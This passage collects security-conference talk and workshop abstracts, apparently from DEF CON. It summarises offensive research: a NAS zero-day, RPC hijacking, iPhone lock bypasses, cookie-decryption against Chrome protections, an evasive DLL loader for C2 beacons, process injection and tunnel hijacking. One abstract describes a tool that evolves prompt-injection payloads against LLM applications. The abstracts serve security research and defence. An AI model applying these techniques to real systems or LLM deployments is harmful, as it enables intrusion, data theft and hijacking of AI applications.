<p>This talk pivots from ""Can AI analyze logs?"" to ""How do we build a trustworthy, human-centric AI partner for investigators?"" We present our journey integrating a Sec-Gemini Log Reasoning Agent into Timesketch, the open-source forensic timeline analysis platform. Our core focus will be how we built the Log Reasoning Agent and the UX research required to make AI findings verifiable and actionable.</p>

<p>We will deconstruct our design philosophy, which reimagines the analyst's workflow around AI-generated insights and investigative questions. We'll explore the specific UI/UX patterns we developed to empower analysts to seamlessly trace AI conclusions back to the source evidence, fostering a ""trust but verify"" mindset essential for high-stakes investigations.

<p>BIC works hard to give more bad days to bad actors. Luckily, threat actors move to a certain rhythm, and following it can be just what you need to give them more blues. This session will demonstrate Domain Intelligence Analysis, a newly discussed concept from our investigations team that equips the audience to efficiently use DNS artifacts to protect their organization. Whether preventing a potential threat or responding to an existing one, DNS can support specific actions that make achieving these goals easier.</p>

<p>Domain Intelligence Analysis informs incident response efforts and can shape detection engineering to identify and investigate threats earlierâwhen context is more valuable. These techniques will be supported with examples of domain and infrastructure discoveries made by our research team, some of which were featured in the 2025 Trends in Malicious Infrastructure report, created with support from two Black practitioners. These examples show how quickly domains can be discovered before they become public IOCs.</p>

<p>Join this presentation to identify relevant IOCs faster and enable more informed, timely investigations into cybercrime.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Last year, both of us (Eliraz and Alon) participated DEF CON, and the Cloud Village was our favorite. One of the topics that was well covered in last's year conference was the threat of Azure Managed Identities abuse. While many offensive aspects related to it were covered as part of DEFCON, and different articles and talks over the past year, the defensive aspects of it remained uncovered.
This year we want to visit the cloud village again, this time sharing our research of the last 4 months, in which we will fill in this significant defensive gap to complement last year's talks, by focusing on proactive threat-hunting techniques to identify and address Azure MI abuse. By examining common attack vectors and presenting advanced detection strategies, we aim to bridge the visibility gap and equip security teams with practical tools for forensic investigation and real-time monitoring using diverse Microsoft log sources. </p>

<p>We aim to empower participants with advanced strategies for leveraging Microsoft log sources, providing practical knowledge and detailed examples that span both real-time monitoring and forensic investigation. This talk is grounded in comprehensive research weâve conducted over the past few months, during which we simulated various MI abuse scenarios and analyzed relevant logs and detection opportunities across dozens of enterprise environments.
Weâve already released the first 2 parts of our research series, the first part in which we explore the blast radius of a compromised Managed Identity and the significance of NHIs (Non-Human Identities) in the broader cloud threat landscape, and the second one in which we covered threat hunting, investigation techniques, and forensic analysis of such incidents. In this talk, we will cover this and more!
Attendees will leave this session equipped with key takeaways that will help them immediately recognize and respond to incidents involving compromised Managed Identities. Theyâll learn how to quickly determine if an MI was involved, assess its blast radius, correlate activity across five or more Azure log sources, and use Azure-specific forensic artifacts to speed up containment and remediation.
And this isnât just for incident response teams - SOC analysts and detection engineers will gain tools and techniques for building targeted detections that bring MI-based threats into visibility. Offensive security professionals will benefit too, gaining a clearer understanding of how MIs can be abused to move laterally across Azure subscriptions, Entra ID, Microsoft 365, and even hybrid environments.</p>

<p>Apple Intelligence, Appleâs newest AI product, is designed to enhance productivity with AI while maintaining Apple's focus on user experience and privacy, often highlighting its use of localized models as a key advantage. But how well do these assurances hold up under scrutiny? While Apple emphasizes privacy as a core principle, my findings challenge some of these claims, illustrating the importance of scrutinizing AI-driven assistants before widespread adoption.</p>

<p>In this talk, we take a closer look at the data flows within Apple Intelligence, examining how it interacts with user data and the potential security and privacy risks that come with it. Using traffic analysis and OS inspection techniques, we explore what information is accessed, how it moves through the system, and where it gets transmitted. Our findings challenge common security assumptions of Apple, revealing unexpected behaviors and data leaks. From encrypted traffic to data leakage concerns, this presentation will provide practical insights for users and security professionals alike.</p>

<p>Network Attached Storage (NAS) devices are indispensable in many corporate and home environments. These devices often live on the network edge, providing convenient remote access to confidential files and internal networks from the public internet. What happens when this goes terribly wrong?</p>

<p>In this presentation, Iâll discuss how I developed a zero-day exploit targeting dozens of Synology NAS products. At the time of discovery, the exploit facilitated unauthenticated root-level remote code execution on millions of NAS devices in the default configuration. My exploitation strategy centered around smuggling different types of delimiters that targeted multiple software components.</p>

<p>In the past, exploitation of the vulnerabilityâs bug class demanded additional primitives that werenât available on my targets. While searching for alternative paths, I discovered a novel remote Linux exploitation technique. Iâll be presenting this technique, which can be used in other researchersâ exploit chains in the future. For the first time in public, Iâll also be discussing the details of my Synology vulnerability research, which won a $40,000 prize at the October 2024 Pwn2Own competition.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The RPC protocol allows executing functions on remote servers. An interface is identified by a UUID, and clients contact specific RPC endpoints to communicate with it. Some endpoints may be well-known to clients, but some are provided through the EPM (Endpoint Mapper). These are called Dynamic Endpoints.</p>

<p>As servers request to map UUIDs to their Dynamic Endpoints, we wondered what stops us from mapping a UUID of a trusted RPC interface to an endpoint that we control, leading to our own malicious RPC interface.</p>

<p>We discovered that nothing stops unprivileged users from imposing as a well-known RPC server! However, to have clients connect to us, we needed to register first. We, as the underdog racer, need to beat services in their home race track.</p>

<p>We examined the status of RPC servers at certain points during boot and mapped several interfaces we can abuse. We then took a shot racing their services and won the gold medal! Various high integrity processes and some even PPLs trusted us to be their RPC server!</p>

<p>In this talk, weâll present âRPC-Racerâ - a toolset for finding insecure RPC services and winning the race against them! Weâll show it manipulating a PPL process to authenticate the machine account against any server we want! Finally, weâll describe how to validate the integrity of RPC servers, to mitigate this issue.</p>

<p>Apple champions user privacy and security, but beneath its glossy screens and polished interfaces lies an overlooked field of subtle vulnerabilities lurking within trusted, everyday features: Siri, Spotlight, Safari, Apple Intelligence, and Apple's official support systems. This talk dives deeply into multiple zero-day issues discovered on fully updated, non-jailbroken iPhonesâno specialized tools required. I'll demonstrate how missing lock-state checks, Siri context confusion, race conditions, faulty Unicode parsing, incomplete patches, and other subtle oversights enabled me to bypass Face ID locks, retrieve sensitive user data, spoof emails, and trigger daemon crashes. Specifically, I'll show you how I disclosed sensitive data on locked devices via Siri (CVE-2025-24198) and Spotlight (CVE-2024-44235), bypassed Safari's Face ID protection on private tabs (CVE-2025-30468), executed deceptive email spoofing (CVE-2025-24225), leaked Apple Intelligence internal prompts and Private Cloud Compute data to ChatGPT, and exploited an unresolved IDOR vulnerability on Apple's support site to retrieve almost any customer data.</p>

<p>For more than five years, firewall vendors have been under persistent, cyclical struggle against a well-resourced and relentless China-based adversary that has expended considerable resources developing custom exploits and bespoke malware expressly for the purpose of compromising enterprise firewalls in customer environments. In this first-of-its-kind presentation, Andrew Brandt will walk attendees through the complete history of the campaign, detailing the full scope of attacks and the countermeasures one firewall vendor developed to derail the threat actors, including detail into the exploits targeting specific firewalls, and malware deployed inside the firewalls as a result of these attacks. </p>

<p>Fundamental to this presentation is the fact that the adversary behind this campaign has not targeted only one firewall vendor: Most of the large network security providers in the industry have been targeted multiple times, using many of the same tactics and tools. So this serves not merely as a warning to the entire security industry, but as an urgent call to the companies that make up this industry to collectively combat this ongoing problem. Because at the end of the day, we all face the same threat, and we cannot hope to withstand the tempo and volume of these attacks alone. We must work together.</p>

<p>This workshop is for SOC analysts, threat hunters, and defenders dealing with alert fatigue, fragmented telemetry, and the challenge of spotting coordinated attacks. Instead of large language models or costly vendor tools, weâll use open-source, explainable ML to map alerts, logs, and events into contextualized attack stories.</p>

<p>Attendees will work hands-on with real-world-style data to find root causes, build kill chains, and generate actionable ticketsâFalse Positive, Incident, and Attack Storyâthat mirror real SOC workflows. Weâll use the Attack Flow Detector tool, which runs in Google Colabâno install needed.</p>

<p>No data science experience required. The class is technical but beginner-friendly, with guided exercises and examples. Basic knowledge of logs and MITRE ATT\&amp;CK helps but isnât required. The focus is on outcomes: understanding what happened, why, and how to respondâwithout black-box AI or complex queries.</p>

<p>By the end, students will know how to clean noisy data, map alerts to attacker techniques, cluster related events, and build end-to-end attack narratives. All tools and content are open-source, transparent, and ready to use in real environments.</p>

<p>Assembly language has a reputation for being intimidating, but once you learn the basics--and know how to read the documentation for the rest--you can easily pick up the rest. There are many interesting fields of study in computer security that depend on the ""closer to the metal"" knowledge you'll gain from learning to code in assembly:</p>

<ul>
<li>Software reverse engineering</li>
<li>Vulnerability and exploit research</li>
<li>Malware/implant development</li>
<li>Digital forensics</li>
</ul>

<p>...among others. There is no substitute for the confidence that you gain from being able to research and understand computer systems at lower levels of abstraction.</p>

<p>The purpose of this workshop is to introduce Intel x64 architecture and assembly language to the attendees. We will be using the Microsoft Macro Assembler, and we will be examining our code step-by-step in the x64dbg debugger. No prior programming experience is required--we will be working on things from first principles. There will be few slides. This is a new version of the workshop that makes better use of the x64dbg debugger to illustrate concepts of the class, live. Attendees can follow along with their own laptops and programming environments.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Ever wanted to tinker with a real industrial controller without risking a plant meltdown? In this workshop, you'll get to play in a PLC playground using actual industrial control hardware like the MicroLogix 1100 PLC that simulates physical processes like a fluid tank and a garage door. Guided by ladder logic programming and Proportional Integral Derivative (PID) tuning exercises, you will program the PLC to maintain tank levels and move machines, observing how the control system responds in real-time.</p>

<p>This workshop focuses on directly interacting with and exploiting the physical PLC hardware and its underlying protocols with a hardware-in-the-loop setup that includes an HMI. Participants won't just click buttons. They'll write ladder logic, interact with real I/O, and observe how PLCs process and respond to industrial inputs in real-time. Along the way, we'll highlight common ICS quirks and vulnerabilities (from insecure protocols to ""insecure by design"" logic) that can make these systems a hacker's playground. The Hardware In the Loop Industrial Control System (HILICS) kits used in this workshop are an open-source project that was designed and built by the Air Force Institute of Technology (AFIT) to provide a safe, scalable platform for exploring the cyber-physical dynamics of ICS environments.</p>

<p>DLL Loading is one of the most important parts of the Windows system. When you install, run, use, or hack a system, you will always use DLL. This DLL mechanism has been exploited for several years for malware development through several techniques : DLL injection, Reflective DLL but do you really know how Windows is loading a DLL ? The sections used, the internal structures and how the dependencies are resolved. Are you able to design your own Perfect DLL Loader that fully integrate with the WIN32API?
In this workshop, you will dive into the Windows DLL mechanism to understand how all of it works internally. With a decompiler, trial and errors, step by step, you will build your own (almost) Perfect DLL loader.
You will try to load from the simple AMSI.DLL to the most complex WINHTTP.DLL. At each step, you will dive deeper into the Windows Internals.
Malware developers, you will be able to use this code as a PE loader that never failed me for the last years and a DLL loader that does not raise the LoadImage kernel callback you can use on your own C2 beacon.
WARNING: while this is a windows internal DISCOVERY course, it is still a HIGHLY TECHNICAL workshop. You should have some entry-level knowledge on Windows systems, C programing and reverse engineering to fully enjoy the workshop.</p>

<p>Prompt injection is an emerging and poorly standardized attack vector targeting large language model applications. Unlike traditional vulnerabilities, there is no universal testing methodology or tooling, making it difficult for penetration testers to assess the security posture of LLM-integrated systems. Matrix Prompt Injection Tool aims to fill this gap by automating the generation of diverse prompt injection payloads. [1] Dynamic Input Detection: MPIT scans target websites to identify expected input fields where LLMs might process user requests. [2] Payload Enrichment: Each pattern includes crafted elements such as exploit strings, delimiters, and reasoning cues, enhancing the quality of the penetration test. [3] Genetic Algorithm Optimization: The tool employs a genetic algorithm to evolve and refine injection patterns, increasing their success rate significantly across different LLM defenses. [4] Practical Utility for Pentesters: MPIT is designed to support real-world offensive security assessments, making LLM-targeted testing more feasible and effective. ShinoLLMApps is a collection of vulnerable LLM web applications that use RAG and tools to help you test MPIT and better understand prompt injection and its risks.

<p>Apple Find My is a crowdsourced offline tracking network designed to assist in recovering lost devices while maintaining privacy. By leveraging over a billion active Apple devices, it has become the world's largest device-locating network. While prior research has demonstrated the possibility of creating DIY trackers that attach to the Find My network, they are mainly for personal use and do not pose a threat for remote attacks. Recently, we found an implementation error in the Find My network that makes it vulnerable to brute-force and rainbow table attacks. With a cost of a few US dollars, the exploit turns computers into trackers without requiring root privileges. We are concerned that adversaries and intelligence agencies would find this exploit handy for user profiling, surveillance, and stalking. This demo is especially appealing to those interested in Find My network and Bluetooth tracking technologies. We will review how Find My offline finding works, elaborate in detail about our discoveries, techniques to make practical attacks, and provide source code for fun.</p>

<p>Backdoors and Breaches es un taller interactivo y altamente prÃ¡ctico que utiliza un juego de cartas diseÃ±ado especÃ­ficamente para entrenar a equipos de seguridad en la identificaciÃ³n, anÃ¡lisis y respuesta ante incidentes cibernÃ©ticos. Este taller va mucho mÃ¡s allÃ¡ de la teorÃ­a, permitiendo a los participantes experimentar situaciones realistas de ciberataques en un entorno controlado, colaborativo y, sobre todo, didÃ¡ctico.<em>x000D</em>
<em>x000D</em>
Durante la sesiÃ³n, los participantes trabajarÃ¡n en equipo para resolver incidentes simulados. Cada carta representa un elemento clave de la cadena de ataque: desde el compromiso inicial, persistencia, escalada de privilegios y movimiento lateral, hasta la comunicaciÃ³n con servidores de comando y control (C2) y la exfiltraciÃ³n de datos. TambiÃ©n se incluyen cartas de ""injects"" que aÃ±aden complicaciones inesperadas, y ""procedures"" que permiten emplear tÃ©cnicas y recursos defensivos. Esto obliga a los jugadores a pensar estratÃ©gicamente, adaptarse y tomar decisiones rÃ¡pidas, simulando la presiÃ³n y la incertidumbre que acompaÃ±an los incidentes en la vida real.<em>x000D</em>
<em>x000D</em>
El taller inicia con una breve explicaciÃ³n del juego y sus categorÃ­as de cartas, seguida de la presentaciÃ³n de un escenario que los equipos deberÃ¡n investigar y resolver. A lo largo del ejercicio, los participantes lanzarÃ¡n dados para determinar el Ã©xito o fracaso de acciones clave, aprendiendo a interpretar probabilidades, planificar respuestas y trabajar con recursos limitados. AdemÃ¡s, cada paso del juego serÃ¡ comentado y relacionado con tÃ©cnicas reales de respuesta ante incidentes, controles de seguridad, y procesos de detecciÃ³n y mitigaciÃ³n utilizados en entornos profesionales.<em>x000D</em>
<em>x000D</em>
El objetivo principal de este taller es fortalecer la capacidad de anÃ¡lisis, colaboraciÃ³n y toma de decisiones bajo presiÃ³n. Los asistentes no solo aprenderÃ¡n a detectar vectores de ataque, sino tambiÃ©n a emplear herramientas forenses, aplicar medidas de contenciÃ³n y erradicaciÃ³n, y comunicar de forma efectiva sus hallazgos y acciones. La sesiÃ³n estÃ¡ pensada tanto para equipos SOC, analistas de seguridad, estudiantes y profesionales de ciberseguridad, como para cualquier persona interesada en mejorar sus habilidades prÃ¡cticas de respuesta a incidentes.<em>x000D</em>
<em>x000D</em>
Al final del taller, los participantes habrÃ¡n desarrollado confianza en su capacidad para enfrentar incidentes reales, comprendido la importancia del trabajo en equipo y habrÃ¡n vivido de primera mano cÃ³mo las pequeÃ±as decisiones pueden tener un gran impacto en la seguridad de una organizaciÃ³n.<em>x000D</em>

<p>The rapid advancement of deepfake technology, powered by generative adversarial networks (GANs), has revolutionized creative industries but poses significant challenges to global financial security through identity fraud. This study examines the legal and regulatory frameworks addressing deepfake-enabled financial crimes in the UK, EU, and Asia, highlighting the growing sophistication of such fraud, exemplified by a 2024 case in Hong Kong where cybercriminals used deepfake video conferencing to defraud a multinational company of $25 million. Employing a comparative legal analysis and case study approach, this research evaluates the effectiveness of existing regulations, identifies enforcement challenges, and analyzes real-world cases to expose legal gaps. Findings reveal that while China has implemented specific deepfake regulations, the UK, EU, and Hong Kong rely on broader fraud and data protection laws, lacking targeted provisions. These inconsistencies hinder prosecution and cross-jurisdictional cooperation. The study proposes balanced regulatory strategies to combat deepfake-enabled financial fraud while fostering AI innovation, offering critical insights for policymakers, legal practitioners, and financial institutions navigating this evolving threat landscape.</p>

Imagine this: You log into your favourite website, confident that Chromeâs latest security enhancements like tightened cookie access controls and session isolation are keeping you safe. But behind the scenes, cybercriminals are pulling off a high-stakes digital heist, quietly hijacking your login sessions without ever touching your password. In this deep dive into the high-stakes game of cybersecurity cat-and-mouse, we uncover how modern infostealers like RedLine, Raccoon Stealer, Vidar, and LummaC2 are actively bypassing Chromeâs newest defenses. These stealthy, modular tools are engineered to extract session cookies directly from memory or browser storage granting attackers full, persistent access to user accounts by impersonating valid sessions. This isn't just theoretical: threat actors are leveraging these tools at scale, using advanced evasion techniques like in-memory execution, DLL injection, and encrypted C2 channels to slip past traditional defenses. Meanwhile, a thriving underground economy continues to monetize stolen digital identities, turning session cookies into instant access to email, banking, cloud dashboards, and more. What weâre witnessing isnât just technical innovation itâs a fast-moving arms race shaping the future of browser security, session management, and digital trust. Donât miss how this evolving threat landscape is redefining what it means to stay secure onlineâand the critical steps defenders need to take to stay ahead.<br />

<p>Inspired by the popular container sidecar pattern, this talk demonstrates a generic, open source NixOS module that brings the same security and isolation to bare metal services. Weâll explore how to declaratively wrap any systemd service, placing it in an isolated network namespace with its own mesh network client (e.g., Tailscale or Netbird). This approach makes services securely accessible on your mesh, fully firewalled from the hostâno application changes required. Good fit for folks exploring declarative infrastructure and looking for practical ways to apply modern security patterns to their own servers.</p>

<p>The Pall Mall Process is a multilateral initiative led by the UK and France to address the proliferation and misuse of commercial cyber intrusion capabilities (CCICs) - but what that means in practice is that theyâre writing rules for hackers, security researchers, and the companies that employ them. The process recently concluded a Code of Practice for States, and is turning to the question of: what responsibility does the hacking and cybersecurity industry bear?</p>

<p>Join the Hacking Policy Council (a coalition of offensive security practitioners, platforms, and vendors) and representatives of governments convening the Pall Mall Process to discuss what a Code of Practice for Industry could look like, and how to ensure that it protects good faith hackers and researchers. Weâre tackling big questions: Should companies share zero-days with governments, and when? What makes a bug bounty âgood faithâ? How do we keep research ethical without strangling it with red tape?</p>

<p>We will give hackers a behind-the-scenes look at the policy debates shaping global cybersecurity norms, share our thinking, and invite critique, chaos, or consensus from the DEF CON community. Whether youâre a red teamer, researcher, builder, or breaker - join the policy hackers to share how you think we should make (or break) this code.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Discovering subdomains is an important practical skill and the first step in attack surface management. Solutions that are both comprehensive and fast (âfind ALL the subdomains and do it QUICKLY!â) are particularly prized. But like much of infosecâeasier said than done!<em>x000D</em>
<em>x000D</em>
Our team won the DEF CON 31 Recon-Aacharva subdomain challenge and our passion for Reconnaissance drove us to go further. A post-hoc review identified an alternative approach that yielded 100 times more raw domains than our original winning submission, and that approach took just a couple of hours. The key? Rather than relying on the open source âsubfinderâ tool, we used a passive DNS tool that returned only RRnames and RRtypes, along with relatively tight time fencing and parallel query streams. Enumerating subdomains that way is a straightforward taskâbut thereâs a catch!<em>x000D</em>
<em>x000D</em>
The real challenge for accurate enumeration turns out to be excluding DNS wildcardsâdomains that will resolve any arbitrary hostname, even random gibberish. For example, âaiuojad.tumblr.comâ resolves because tumblr.com is a DNS wildcard. Typical DNS wildcards usually arise at the 2nd-level, and even some entire TLDs (such as .ph) are wildcarded. Whatâs less-well known is that âdeepâ wildcards also exist further left in the FQDN, or exist only for specific RRtypes. While obscure, deep wildcards are surprisingly prevalent and exploitable for reflective DDoS purposes. While they can be used carefully for legitimate objectives, they can also devolve into abusable nuisances, capable of producing large volumes of cache-defeating response traffic when hit with spoofed/randomized DNS queries. They can even be abused to make it appear that a benign site has CSAM content or supports terrorism, etc., since arbitrary queries for such labels will find their way into the passive DNS record for all to see.<em>x000D</em>
<em>x000D</em>
If your site has any deep wildcards, they add an attack surface exposure you may not have been aware of; we recommend reconsidering the need for the wildcards and if they are truly necessary, carefully monitoring how those names are getting (ab)used. Our presentation demonstrates some methods for efficiently assessing a domainâs DNS wildcard status, and suggests a new âstandard of careâ for routine testing and logging of the wildcard status of ALL (FQDN, RRtype) combinations, much as you might log, geolocate, and port scan IPs you interact with. Join us as we share the technique that yielded more than 100x the number of subdomains we found in our winning entry.<em>x000D</em></p>

<p>This session explores advanced security mechanisms implemented by major browsers to prevent cookie theft from their storage databases. Chrome has recently implemented AppBound encryption, which provides multi-layered protection for session cookies:</p>

<p>1) A 2-way DPAPI encryption system that operates with both elevated NT AUTHORITY\SYSTEM permissions and normal user-level decryption capabilities;</p>

<p>2) A state-key encryption layer utilizing the ChaCha20Poly1305 algorithm with custom keys (that once was AES-256-GCM encrypted);</p>

<p>These implementations have significantly reduced the effectiveness of info-stealing malware. However, this session will demonstrate potential vulnerabilities in these security measures and explain how to obtain decrypted cookies despite these protections. We will examine the new format specifications and encryption methodologies for cookies.</p>

<p>Beyond Chromium-based browsers, we'll explore Gecko's encryption algorithms, which involve structured ASN.1 data formats with multiple encryption schemes including 3DES and AES-256. We'll also analyze Chromium on macOS which relies on PBKDF2 key derivation, and WebKit-based browsers that store cookies in binary cookie files.</p>

<p>Additionally, we'll discuss Chrome's forthcoming ""Device Bound Session Cookies"" (DBSC) technology, which aims to further mitigate session hijacking through cookie theft by implementing TPM chip-based encryption and requiring proof of possession of the cryptographic key.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>This hands-on workshop introduces ModuleOverride, a novel technique for process injection, enabling the reuse of existing memory sections to inject and execute malicious shellcode within running Windows processes.</p>

<p>Participants will explore key challenges in security research and development, examining how certain constraints in shellcode generationâsuch as the inability to specify an exit functionâcan drive creative solutions, like dynamically patching shellcode within an active process during injection.</p>

<p>Attendees will engage in live demonstrations and interactive exercises, gaining first-hand experience as we walk through the final phase of the research, tackling technical hurdles encountered during development to ensure a successful process injection.</p>

<p>Weâll also hold an open discussion on detection strategies, encouraging participants to brainstorm and explore possible ways to identify ModuleOverride.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Debra Bowen, The Honorable<br>
<p>Debra Bowen was the elected Secretary of State of California for two terms from 2007 to 2015. Prior to that, from 1992 to 2006, she had been a member of the California Assembly and then the Senate.  In 2007, at the beginning of her term as Secretary of State, she commissioned the Top to Bottom Review (TTBR) of voting systems used in California. The review involved top computer security researchers, attorneys, and accessibility experts, and provided the nation with an unprecedented view into the state of voting machines. The TTBR led to critical changes to improve Californiaâs elections and influenced other states to move away from the most insecure voting systems. In parallel she commissioned the Post Election Audit Standards Working Group (PEASWG), a group of experts charged with outlining standards for election auditing. From their report emerged the very first formal description of what came to be known as risk-limiting audits (RLAs), now widely viewed as the âgold standardâ of auditing techniques. RLAs make the notions of evidence-based elections and software independence, two of the fundamental pillars of election integrity, an achievable goal.For her âbold leadership and her steadfast resolve to protect the integrity of the voteâ she was honored with a 2008 Profile in Courage Award by the John F. Kennedy Presidential  Library and Museum.</p>

<p>As threat actors evolve in speed, sophistication, and stealth, traditional defense strategies alone are no longer sufficient. This panel delves into the strategic importance of adopting an adversarial mindset, where defenders must think like attackers to stay ahead. 
Industry experts will discuss how adversary emulation and offensive cyber security techniques are being used not just to test systems, but to actively inform and strengthen defensive strategies. From red teaming to threat-informed defense, the panel will dive into how organizations are embedding adversarial thinking into their security programs to uncover blind spots, reduce response times, and build resilience against real-world threats. Whether you are defending an enterprise or building the next wave of security tools, embracing the adversarial mindset is no longer optional, it is essential.
The panel will also cover a range of adversarial scenarios, including not only nation-state sponsored threat actors and targeted cyberattacks, but also the evolving warfare landscape witnessed recently, the use of technology by adversaries during conflicts, and effective countermeasures to address these challenges.</p>

<p>In 2017, hackers breached a casinoâs network by pivoting through their internet connected fish tank sensor, stealing the customer's sensitive data. This multi-million dollar breach exposed core IoT pitfalls such as default credentials, flat networks that allow lateral movement, and insecure supply chains. This is the reality of unvetted IoT integrations, a single device can open up additional attack surfaces and become your weakest link. Yet enterprises keep deploying third-party IoT gear for efficiency often without thorough security reviews. In this talk, weâll map the attack tree and uncover risks from hardware tampering, insecure protocols, cloud/API flaws, and supply-chain attacks. Then weâll share a four phase shift-left process to bake in security from day one (1) Scope &amp; threat modeling, (2) Vendor audits, (3) Device attestation, (4) Secure integration, so defenses align with attack vectors, turning âplug-and-playâ into âplug-and-prove.â</p>

<p>NPM Imposters is a fast, team-based game where players must spot malicious NPM packages hiding in plain sight.
Each team gets a deck of cards mimicking real npmjs.com pages â some show metadata like stars, downloads, and maintainers; others reveal parts of the package code, like index.js or package.json.
The challenge? Identify which packages are safe, suspicious, or outright malicious.
Once teams decide, they flip each card to reveal the truth, with a quick explanation based on real-world attacks like event-stream and ua-parser-js.
Itâs a fun, hands-on way to learn how supply chain attacks happen, and how easily trust can be exploited</p>

<p>Desktop applications are the forgotten attack surface of bug bounty hunting. They're usually out of scope, but they talk to assets that aren't. In this talk, I'll share how I've earned bounties by targeting desktop apps directly or leveraging them to find bugs in paying assets.</p>

<p>We'll start with traffic interception. Unlike browsers, desktop apps don't always like proxies. I'll walk through my bag of tricks for viewing and modifying traffic, revealing hidden APIs not exposed in the web interface, broken OAuth flows, and secrets leaking in requests.</p>

<p>Next item on the menu are binaries. This won't be a full-blown reverse engineering course, but I'll show how tools like Ghidra, dnSpy, and even strings have helped me extract secrets from binaries, bypass client-side checks, and uncover logic flaws. We'll also look at how Process Monitor has helped me observe app behavior and uncover where secrets are stored.</p>

<p>Finally, I'll build on my previous DEF CON village talk about jumping the browser sandbox, sharing my now disclosed bugs in protocol handlers and local HTTP servers that led to five-figure bounties.</p>

<p>If you've been ignoring desktop apps in your bounty hunting, this talk might change your mindâand your bank account.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In every modern Azure environment, Service Principals drive automation and integration. Yet, to support enterprise solutions in identity governance, cloud security, and DevOps automation, these principals are often endowed with broad Microsoft Graph API permissionsâsuch as RoleManagement.ReadWrite.Directory, Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, and ServicePrincipalEndpoint.ReadWrite.All. Even Entra ID roles that are not typically classified as âprivilegedâ can be exploited, enabling attackers to modify Service Principal configurations and escalate privileges in unexpected ways.
This session reveals groundbreaking research that uncovers how excessive Graph API permissions and the abuse of nonâprivileged Entra ID roles create new exploitation pathways in Azure. We will detail common misconfigurations that, when left unmonitored, allow attackers to seize control of Service Principals and manipulate application configurations. In doing so, we introduce Azure AppHunterâa novel openâsource tool that scans Azure environments for Service Principals with dangerous permissions and maps out potential attack vectors.
Attendees will gain practical techniques for detecting and mitigating these vulnerabilities, enforce least privilege, and integrate continuous auditing into their security workflowsâall essential for securing Azure deployments against emerging threats.</p>

And as the framework continues to evolve, even experienced developers can struggle to keep pace with its rapidly expanding capabilities.</p>

<p>This talk explores critical areas that frequently trip up developers, such as caching behaviors and authorization deadlines, before diving into Endpoint Securityâs more advanced features like mute inversions. We'll also cover recently introduced capabilitiesâincluding the long-awaited TCC event monitoring which offer unprecedented visibility into permission-related activity often targeted by malware.</p>

<p>Imagine your home modem as a loaded gun aimed at global security. Our research exposes critical vulnerabilities in ISP-supplied modemsâADSL, fiber, cable, 5Gâthat inherently threaten power grids, water systems, and ATMs. Over 35 severe flaws have been identified, rooted in outdated IoT SDKs, affecting millions globally. These issues allow attackers to manipulate essential services without direct hijacking.</p>

<p>Despite the severity of these vulnerabilities, manufacturers and ISPs consistently refuse to address them, leaving these devices as perpetual threats. We provide essential tools for detection and defense against such negligence.</p>

<p>In this session, you'll learn how to identify these inherent weaknesses that compromise infrastructures through device flaws. Gain practical skills in vulnerability hunting and crafting defenses, while navigating the landscape of responsible disclosure amidst industry inertia.</p>

<p>Join us to confront a crisis long ignored. When hackers exploit these systemic failures, it's not just personal data at riskâit's the stability of our world's crucial infrastructure.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Gaining initial access to an intranet is one of the most challenging parts of red teaming. If an attack chain is intercepted by an incident response team, the entire operation must be restarted. In this talk, we introduce a technique for gaining initial access to an intranet that does not involve phishing, exploiting public-facing applications, or having a valid account. Instead, we leverage the use of stateless tunnels, such as GRE and VxLAN, which are widely used by companies like Cloudflare and Amazon. This technique affects not only Cloudflare's customers but also other companies.</p>

<p>Additionally, we will share evasion techniques that take advantage of company intranets that do not implement source IP filtering, preventing IR teams from intercepting the full attack chain. Red teamers could confidently perform password spraying within an internal network without worrying about losing a compromised foothold. Also, we will reveal a nightmare of VxLAN in Linux Kernel and RouterOS. This affects many companies, including ISPs. This feature is enabled by default and allows anyone to hijack the entire tunnel, granting intranet access, even if the VxLAN is configured on a private IP interface through an encrypted tunnel. What's worse, RouterOS users cannot disable this feature. This problem can be triggered simply by following the basic VxLAN official tutorial. Furthermore, if the tunnel runs routing protocols like BGP or OSPF, it can lead to the hijacking of internal IPs, which could result in domain compromises. We will demonstrate the attack vectors that red teamers can exploit after hijacking a tunnel or compromising a router by manipulating the routing protocols.</p>

<p>Lastly, we will conclude the presentation by showing how companies can mitigate these vulnerabilities. Red teamers can use these techniques and tools to scan targets and access company intranets. This approach opens new avenues for further research.</p>

<p>References:</p>

<p>I have seen discussions about source IP address spoofing with stateless tunnels, similar to research on <a href=""https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nxos-ipip-dos-kCT9X4"">CVE-2020-10136</a> which uses IPIP tunnels. However, this research omits the possibility of using stateless tunnels for initial access. The PoC only provides methods to launch DoS attacks such as UDP flooding, TCP SYN attacks, and ARP spoofing, which do not require a response. Notably, there is no method to find a stateless tunnel in previous research, making real-world attacks impractical.</p>

<p>With the commoditization of IoT surveillance technology, private and public entities alike have been rushing to put every facet of our lives under surveillance. Unfortunately, schools are no exception in the ongoing privacy race to the bottom. In this talk, we present our analysis of a popular line of IoT vape detectors marketed primarily to schools. Rey first learned of the existence of this device while he was a student in high school, scanning the local network during his lunch break. He became obsessed with the idea of reverse-engineering it, and a couple of years later he got an opportunity when a specimen appeared on eBay.</p>

<p>This talk will cover our journey of acquiring the device and doing a hardware teardown. Then, we'll talk about dumping the firmware, examining its behavior, and doing some light reverse-engineering to uncover some fun appsec vulnerabilities. We'll discuss implications of our findings on this particular series of devices, as well as on the ed-tech surveillance industry as a whole.</p>

<p>We will release a copy of the device filesystem, as well as our scripts for decrypting OEM firmware and packing custom firmware updates. </p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>El ciberengaÃ±o es un tipo de protecciÃ³n valiosa para detectar, interrumpir e influir en los adversarios dentro de una red. Sin embargo, definir planes de ciberengaÃ±o viables presenta desafÃ­os importantes. Esta sesiÃ³n proporciona una metodologÃ­a estructurada para acotar esta brecha, permitiendo el diseÃ±o e implementaciÃ³n de actividades eficaces sobre entornos de producciÃ³n.<em>x000D</em>
<em>x000D</em>
La presentaciÃ³n abarcarÃ¡ la siguiente metodologÃ­a dividida en cuatro fases:<em>x000D</em>
